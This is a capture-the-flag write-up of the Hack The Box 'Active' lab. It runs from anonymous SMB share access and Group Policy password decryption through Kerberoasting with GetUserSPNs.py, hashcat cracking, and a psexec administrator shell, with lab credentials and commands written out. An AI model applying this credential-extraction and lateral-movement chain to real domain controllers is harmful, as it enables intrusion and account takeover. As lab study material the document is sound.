# Active

Tags: Easy, Tj Null, Windows
start Date: February 19, 2024
End Date : February 20, 2024
Status: Done

| svg_tgs | GPPstillStandingStrong2k18 |
| --- | --- |
| Administrator | Ticketmaster1968 |
|  |  |

## Tools

1. Nmap 
2. smbmap 

---

Nmap Scan 

```python
──(kali㉿kali)-[~/Desktop/HTB/BLocky]
└─$ nmap -sV -sC 10.10.10.100                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 11:22 EST
Nmap scan report for 10.10.10.100
Host is up (0.16s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-19 15:23:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-19T15:24:13
|_  start_date: 2024-02-18T13:22:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.40 seconds
```

Added `10.10.10.100 active.htb` to `/etc/hosts` file so that we can get the domain easily.

```python
─$ smbmap -H 10.10.10.100   

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

I have run smbmap and saw files which are shared and now I have downloaded files in Replicate 

```python
──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.100/Replication                
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (3.1 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.3 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.3 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: 
```

```python
┌──(kali㉿kali)-[~]
└─$ cat \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
cat: active.htbPolicies{31B2F340-016D-11D2-945F-00C04FB984F9}MACHINEPreferencesGroupsGroups.xml: No such file or directory
cat: of: No such file or directory
cat: size: No such file or directory
cat: 533: No such file or directory
cat: as: No such file or directory
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

```python
┌──(kali㉿kali)-[~]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

![Untitled](Active%20d4d590c8848a46b9b7fecc86ca03280f/Untitled.png)

```python
──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.100/Users -U active.htb/svc_tgs
Password for [ACTIVE.HTB\svc_tgs]:
Try "help" to get a list of possible commands.
smb: \>
```

We got the user.txt file SMB 

```python
smb: \SVC_TGS\Desktop\> get user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

```python
──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ cat user.txt         
b869640a64f98d092251b8a0c9066800
```

We ran get user script and get admin hash.

```python
./GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```

![Untitled](Active%20d4d590c8848a46b9b7fecc86ca03280f/Untitled%201.png)

We will copy that hash to our dirrectlty and crack it will hashcat 

```python
sudo hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

With the password cracked, I was able to use [psexec.py](http://psexec.py/) to connect to the machine as the Administrator and capture the final flag.

```python
psexec.py active.htb/administrator@10.129.193.5
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password:
[*] Requesting shares on 10.129.193.5.....
[*] Found writable share ADMIN$
[*] Uploading file utdeQdHw.exe
[*] Opening SVCManager on 10.129.193.5.....
[*] Creating service QIAd on 10.129.193.5.....
[*] Starting service QIAd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

## Resources

[Hack The Box Active Writeup](https://medium.com/@joemcfarland/hack-the-box-active-writeup-a37a1c170cf6)

[AD **Kerberoasting**](https://www.notion.so/AD-Kerberoasting-e4b485bf9a10426faefd53ab2eed5129?pvs=21) for knowing the concept